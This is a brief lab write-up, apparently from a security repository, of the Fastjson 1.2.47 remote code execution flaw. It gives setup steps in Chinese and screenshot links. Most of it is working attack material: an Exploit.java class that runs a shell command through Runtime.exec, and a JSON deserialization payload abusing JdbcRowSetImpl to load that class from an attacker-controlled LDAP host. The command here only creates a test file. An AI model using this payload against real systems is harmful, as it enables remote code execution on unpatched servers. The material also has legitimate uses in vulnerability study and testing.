## fastjson-1.2.47-rce

* 1.靶机搭建
* 2.服务器ldap开启
* 3.攻击机getshell

![](./1.server.jpg)

![](./2.ldap.jpg)

![](./3.poc.jpg)

![](./4.getshell.jpg)

### Exploit.java

    import java.io.BufferedReader;
    import java.io.InputStream;
    import java.io.InputStreamReader;
    
    public class Exploit{
    public Exploit() throws Exception {
    Process p = Runtime.getRuntime().exec(new String[]{"touch /tmp/fastjson.test"});
    InputStream is = p.getInputStream();
    BufferedReader reader = new BufferedReader(new InputStreamReader(is));
    
    String line;
    while((line = reader.readLine()) != null) {
    System.out.println(line);
    }
    
    p.waitFor();
    is.close();
    reader.close();
    p.destroy();
    }
    
    public static void main(String[] args) throws Exception {
    }
    }


### POC

```
{
  "name": {
    "@type": "java.lang.Class",
    "val": "com.sun.rowset.JdbcRowSetImpl"
  },
  "x": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://192.168.124.55:8088/fastjson/Exploit",
    "autoCommit": true
  }
}
```

![](./3.poc.jpg)